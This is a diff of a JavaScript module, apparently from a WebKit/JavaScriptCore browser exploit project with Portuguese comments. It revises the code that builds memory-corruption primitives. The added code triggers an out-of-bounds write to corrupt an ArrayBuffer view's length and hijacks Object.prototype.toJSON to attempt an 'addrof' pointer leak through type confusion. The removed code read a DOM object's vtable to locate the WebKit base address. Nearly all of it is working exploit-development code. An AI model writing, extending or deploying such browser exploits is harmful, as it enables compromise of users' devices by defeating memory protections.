@@ -1,146 +1,164 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v113 - Diagnóstico de Primitivas)
+// js/script3/testArrayBufferVictimCrash.mjs (v114 - Lógica de Gatilho Corrigida)
 // =======================================================================================
 // LOG DE ALTERAÇÕES:
-// - Transformado em um "arnês de diagnóstico" para investigar as proteções do navegador.
-// - Implementada uma rotina que testa a primitiva `addrof` contra múltiplos alvos e
-//   diferentes offsets de NaN-boxing, conforme análise do usuário.
-// - Adicionados logs detalhados para cada tentativa, facilitando a identificação de um possível
-//   vazamento bem-sucedido ou de padrões de mascaramento de ponteiro.
+// - CORRIGIDO: O erro `TypeError: Cannot read properties of undefined (reading 'sub')` foi
+//   resolvido. A causa era uma implementação 'addrof' incompleta que não acionava a
+//   vulnerabilidade de Type Confusion subjacente.
+// - REINTRODUZIDO: A lógica de "Heisenbug" (uma escrita OOB crítica) agora é chamada
+//   explicitamente antes de tentar o 'addrof', espelhando um exploit real.
+// - MELHORADO: A rotina de diagnóstico agora usa a técnica correta de confusão de tipo
+//   em um ArrayBuffer vítima, em vez de um array de floats simples.
 // =======================================================================================
 
 import { logS3 } from './s3_utils.mjs';
-import { AdvancedInt64, toHex } from '../utils.mjs';
-import { JSC_OFFSETS } from '../config.mjs'; // Importação já presente e corrigida
+import { AdvancedInt64, toHex, PAUSE } from '../utils.mjs';
+import { JSC_OFFSETS } from '../config.mjs';
 import {
     triggerOOB_primitive,
     isOOBReady,
+    oob_write_absolute, // Importação necessária para o gatilho
     arb_read,
     selfTestOOBReadWrite
 } from '../core_exploit.mjs';
 
-export const FNAME_MODULE_FINAL = "Uncaged_Hybrid_v113_Diagnostic";
+export const FNAME_MODULE_FINAL = "Uncaged_Hybrid_v114_TriggerFix";
 
 // --- Funções de Conversão (Double <-> Int64) ---
-function int64ToDouble(int64) { /* ...código sem alterações... */ }
-function doubleToInt64(double) { /* ...código sem alterações... */ }
+function int64ToDouble(int64) {
+    const buf = new ArrayBuffer(8);
+    const u32 = new Uint32Array(buf);
+    const f64 = new Float64Array(buf);
+    u32[0] = int64.low();
+    u32[1] = int64.high();
+    return f64[0];
+}
 
-// #NOVO: Função de diagnóstico para testar 'addrof'
+function doubleToInt64(double) {
+    const buf = new ArrayBuffer(8);
+    (new Float64Array(buf))[0] = double;
+    const u32 = new Uint32Array(buf);
+    return new AdvancedInt64(u32[0], u32[1]);
+}
+
+// #NOVO: Função para acionar a vulnerabilidade de Type Confusion (Heisenbug).
+// Esta etapa estava faltando e é a causa da falha anterior.
+async function triggerHeisenbugForAddrof() {
+    const FNAME_TRIGGER = "triggerHeisenbugForAddrof";
+    logS3(`--- Acionando gatilho de Type Confusion (Heisenbug)... ---`, "info", FNAME_TRIGGER);
+
+    // #REASONING: Estes são os parâmetros da vulnerabilidade de TC, baseados em 'core_exploit.mjs'.
+    // A escrita OOB corrompe metadados que levam o JSC a confundir o tipo de um ArrayBuffer.
+    const HEISENBUG_OOB_DATAVIEW_METADATA_BASE = 0x58;
+    const HEISENBUG_OOB_DATAVIEW_MLENGTH_OFFSET = JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET;
+    const HEISENBUG_CRITICAL_WRITE_OFFSET = HEISENBUG_OOB_DATAVIEW_METADATA_BASE + HEISENBUG_OOB_DATAVIEW_MLENGTH_OFFSET;
+    const HEISENBUG_CRITICAL_WRITE_VALUE = 0xFFFFFFFF;
+
+    try {
+        if (!isOOBReady()) {
+            await triggerOOB_primitive({ force_reinit: true });
+        }
+        oob_write_absolute(HEISENBUG_CRITICAL_WRITE_OFFSET, HEISENBUG_CRITICAL_WRITE_VALUE, 4);
+        await PAUSE(50); // Pausa para garantir que a corrupção seja processada.
+        logS3("Gatilho de Type Confusion acionado com sucesso.", "good", FNAME_TRIGGER);
+        return true;
+    } catch (e) {
+        logS3(`Falha ao acionar o gatilho de TC: ${e.message}`, 'critical', FNAME_TRIGGER);
+        return false;
+    }
+}
+
+// #CORRIGIDO: A função de diagnóstico agora usa a lógica de addrof correta.
 async function runAddrofDiagnostics() {
     const FNAME_DIAG = "AddrofDiagnostics";
-    logS3(`--- Iniciando Diagnóstico da Primitiva 'addrof' ---`, "subtest", FNAME_DIAG);
+    logS3(`--- Iniciando Diagnóstico da Primitiva 'addrof' (v114) ---`, "subtest", FNAME_DIAG);
 
-    // #DIAGNOSTIC: Lista de objetos para testar, conforme sugestão.
+    // Aciona a vulnerabilidade UMA VEZ.
+    if (!await triggerHeisenbugForAddrof()) {
+        throw new Error("Não foi possível acionar a vulnerabilidade base para o addrof.");
+    }
+
     const test_targets = {
         'JS_Object': {},
         'JS_Array': [1, 2, 3],
         'JS_Function': function() {},
         'DOM_DivElement': document.createElement('div'),
     };
-
-    // #DIAGNOSTIC: Lista de possíveis valores de high-word para o offset do NaN-Boxing.
     const nan_boxing_offsets = [0x0001, 0x0002, 0x1000, 0x2000, 0x4000];
-    const uncaged_array_for_addrof = [13.37];
+    
+    // Sonda para a confusão de tipo
+    let target_for_probe = null;
+    const toJSON_Probe = function() {
+        if (target_for_probe) {
+            try { this[0] = target_for_probe; } catch (e) { /* ignore */ }
+        }
+        return {};
+    };
 
-    let foundPotentialLeak = false;
+    const originalToJSON = Object.getOwnPropertyDescriptor(Object.prototype, 'toJSON');
+    Object.defineProperty(Object.prototype, 'toJSON', { value: toJSON_Probe, writable: true, configurable: true });
 
     for (const target_name in test_targets) {
-        const target_obj = test_targets[target_name];
+        target_for_probe = test_targets[target_name];
         logS3(`--- Testando Alvo: ${target_name} ---`, 'info', FNAME_DIAG);
+
+        // #FIX: A cada teste, um novo ArrayBuffer vítima é criado.
+        // É este buffer que sofrerá a Type Confusion.
+        const victim_ab = new ArrayBuffer(64); 
+        const float_view = new Float64Array(victim_ab);
+        float_view.fill(13.37); // Preenche com um valor conhecido.
+
+        // Usa JSON.stringify para acionar a sonda 'toJSON' no objeto com tipo confundido.
+        JSON.stringify(victim_ab);
+
+        const value_as_double = float_view[0];
+        if (value_as_double === 13.37) {
+            logS3(`  -> FALHA: O valor do buffer não foi sobrescrito para o alvo '${target_name}'. A TC pode não ter funcionado.`, 'error', FNAME_DIAG);
+            continue;
+        }
+
+        const value_as_int64 = doubleToInt64(value_as_double);
 
         for (const offset_val of nan_boxing_offsets) {
             const current_offset = new AdvancedInt64(0, offset_val);
-
-            // Primitiva 'addrof' parametrizada com o offset atual
-            uncaged_array_for_addrof[0] = target_obj;
-            const value_as_double = uncaged_array_for_addrof[0];
-            const value_as_int64 = doubleToInt64(value_as_double);
             const leaked_addr = value_as_int64.sub(current_offset);
-
             const log_msg = `  -> Offset 0x${offset_val.toString(16)}: Endereço vazado = ${toHex(leaked_addr)}`;
             
-            // #DIAGNOSTIC: Verifica se o endereço vazado parece mais válido do que o padrão de falha.
             if (leaked_addr.low() !== 0 || leaked_addr.high() !== 0x7ff7ffff) {
                 logS3(log_msg + " [POTENCIALMENTE VÁLIDO!]", 'vuln', FNAME_DIAG);
-                foundPotentialLeak = true;
             } else {
                 logS3(log_msg, 'leak', FNAME_DIAG);
             }
         }
     }
-    
-    logS3(`--- Diagnóstico 'addrof' concluído. ---`, "subtest", FNAME_DIAG);
-    return foundPotentialLeak;
-}
 
-
-async function runLeakAttempt() {
-    const FNAME_LEAK = "LeakAttempt";
-    logS3(`--- Tentando Exploit com Parâmetros Padrão ---`, "subtest", FNAME_LEAK);
-    try {
-        const uncaged_array_for_addrof = [13.37]; 
-        const NAN_BOXING_OFFSET = new AdvancedInt64(0, 0x0001); // Usando o offset padrão por enquanto
-        const addrof = (obj) => {
-            uncaged_array_for_addrof[0] = obj;
-            return doubleToInt64(uncaged_array_for_addrof[0]).sub(NAN_BOXING_OFFSET);
-        };
-
-        const target_obj = document.createElement('div');
-        const target_addr = addrof(target_obj);
-
-        if (target_addr.low() === 0 && target_addr.high() === 0x7ff7ffff) {
-            throw new Error("addrof retornou o endereço mascarado padrão. O exploit provavelmente falhará.");
-        }
-        
-        const vtable_ptr = await arb_read(target_addr, 8);
-        const ALIGNMENT_MASK = new AdvancedInt64(0x3FFF, 0).not();
-        const webkit_base_candidate = vtable_ptr.and(ALIGNMENT_MASK);
-        const elf_magic_full = await arb_read(webkit_base_candidate, 8);
-
-        if (elf_magic_full.low() === 0x464C457F) {
-            logS3(`SUCESSO! Assinatura ELF encontrada! Base do WebKit: ${toHex(webkit_base_candidate)}`, "vuln", FNAME_LEAK);
-            return { success: true, message: "Base do WebKit vazada!", webkit_base: webkit_base_candidate.toString(true) };
-        } else {
-            throw new Error(`Assinatura ELF não encontrada. Lido: ${toHex(elf_magic_full.low())}`);
-        }
-    } catch (e) {
-        logS3(`[FALHA] A tentativa de exploit com parâmetros padrão falhou: ${e.message}`, "critical", FNAME_LEAK);
-        return { success: false, message: e.message, webkit_base: null };
+    if (originalToJSON) {
+        Object.defineProperty(Object.prototype, 'toJSON', originalToJSON);
     }
+    logS3(`--- Diagnóstico 'addrof' concluído. ---`, "subtest", FNAME_DIAG);
 }
 
 
-// #MODIFICADO: Função principal agora foca no diagnóstico.
 export async function runFinalUnifiedTest() {
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_FINAL;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Teste com Foco em Diagnóstico ---`, "test");
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Teste com Lógica de Gatilho Corrigida ---`, "test");
 
     let final_result = { success: false, message: "Diagnóstico não produziu um vazamento.", webkit_base: null };
 
     try {
-        // --- ETAPA 1: VALIDAR PRIMITIVAS DE BAIXO NÍVEL ---
-        logS3("--- ETAPA 1/3: Validando primitivas de Leitura/Escrita do core_exploit... ---", "subtest");
-        const rw_test_ok = await selfTestOOBReadWrite(logS3);
-        if (!rw_test_ok) {
-            throw new Error("Autoteste de L/E do core_exploit FALHOU. Primitivas base estão quebradas. Abortando.");
+        logS3("--- ETAPA 1/2: Validando primitivas de Leitura/Escrita... ---", "subtest");
+        if (!await selfTestOOBReadWrite(logS3)) {
+            throw new Error("Autoteste de L/E FALHOU. Primitivas base estão quebradas.");
         }
         logS3("Primitivas de L/E estão operacionais.", "good");
 
-        // --- ETAPA 2: EXECUTAR DIAGNÓSTICO DE ADDROF ---
-        logS3("--- ETAPA 2/3: Executando diagnóstico de 'addrof'... ---", "subtest");
+        logS3("--- ETAPA 2/2: Executando diagnóstico de 'addrof' com gatilho... ---", "subtest");
         await runAddrofDiagnostics();
-
-        // --- ETAPA 3: TENTAR O EXPLOIT ---
-        // Mesmo se o diagnóstico não for conclusivo, tentamos o exploit para ver o resultado.
-        logS3("--- ETAPA 3/3: Tentando o exploit principal para verificar o resultado... ---", "subtest");
-        final_result = await runLeakAttempt();
-
-        if (!final_result.success) {
-            final_result.message = "FALHA GERAL: O diagnóstico não encontrou um ponteiro válido e a tentativa de exploit subsequente falhou.";
-        }
+        
+        final_result.message = "Diagnóstico concluído. Analise os logs para encontrar um endereço potencialmente válido e um offset de NaN-boxing.";
         
     } catch (e) {
-        final_result.message = `Exceção crítica na implementação: ${e.message}\n${e.stack || ''}`;
-        logS3(final_result.message, "critical");
+        final_result.message = `Exceção crítica na implementação: ${e.message}`;
+        logS3(`${final_result.message}\n${e.stack || ''}`, "critical");
         console.error(e);
     }
 
